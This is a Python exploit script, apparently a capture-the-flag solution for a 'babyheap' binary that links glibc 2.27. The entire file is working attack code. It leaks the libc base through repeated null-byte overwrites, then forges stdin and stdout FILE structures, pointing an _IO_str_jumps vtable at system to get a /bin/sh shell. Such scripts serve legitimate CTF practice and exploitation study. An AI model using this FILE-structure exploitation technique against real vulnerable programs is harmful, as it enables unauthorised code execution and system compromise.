#!/usr/bin/env python3
from dn3 import *
from time import sleep

exe = ELF("./chall_patched")

libc = ELF("./libc-2.27.so")

context.binary = exe
context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"
context.aslr = False

global io
breakpoints = '''
#break babyheap
break *babyheap+235
'''+"continue\n"*3+"b system"

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path,gdbscript=breakpoints)
    
DeathNot3(io,libc=libc)

def null_overwrite(offset):
    sla("> ","1")
    sla("size: ",str(0x200000))
    sla("size: ",str(offset+1))
    sla("data:", "AAAA")

def null_overwrite2(offset):
    sl("1")
    sleep(0.1)
    sl(str(0x200000))
    sleep(0.1)
    sl(str(offset+1))
    sleep(0.1)
    sl("AAAA")
    sleep(0.1)

null_overwrite(0x5ed760)

null_overwrite2(0x7ee770)


rec(0x59)
rec(0x8)

libc.address = libcleak("_IO_stdfile_2_lock")


null_overwrite(0x9eea28)

forged_stdin = flt([
    0xfbad208b,                             #_flags
    libc.symbols["_IO_2_1_stdin_"],          #_IO_read_ptr
    0,                                      #_IO_read_end 
    0,                                      #_IO_read_base 
    0,                                      #_IO_write_base 
    0,                                      #_IO_write_ptr
    0,                                      #_IO_write_end 
    libc.symbols["_IO_2_1_stdout_"],         #_IO_buf_base 
    libc.symbols["_IO_2_1_stdout_"]+0x2000   #_IO_buf_end
    ]).ljust(0x83,"\x00")

sl(forged_stdin)

forged_stdout  = p64(0xfbad2886) 
forged_stdout += p64(libc.symbols["_IO_2_1_stdout_"]) * 4 
forged_stdout += p64(0) * 3
forged_stdout += p64(next(libc.search(b"/bin/sh\x00"))//2 - 0x32)
forged_stdout += p64(0) * 4 
forged_stdout += p64(libc.symbols["_IO_2_1_stdout_"]) 
forged_stdout += p32(1) 
forged_stdout += p32(0) 
forged_stdout += p64(0xffffffffffffffff)
forged_stdout += p16(0) 
forged_stdout += p8(0) 
forged_stdout += b'\n'
forged_stdout += p32(0) 
forged_stdout += p64(libc.symbols["_IO_stdfile_1_lock"]) 
forged_stdout += p64(0xffffffffffffffff) 
forged_stdout += p64(0) 
forged_stdout += p64(libc.symbols["_IO_wide_data_1"]) 
forged_stdout += p64(0) 
forged_stdout += p64(0) 
forged_stdout += p64(0) 
forged_stdout += p32(0xffffffff) 
forged_stdout += b'\x00'*20 
forged_stdout += p64(libc.symbols["_IO_str_jumps"]) 
forged_stdout += p64(libc.symbols["system"]) 
forged_stdout += p64(libc.symbols["_IO_2_1_stdout_"])

sl(bytes2str(forged_stdout))

interactive()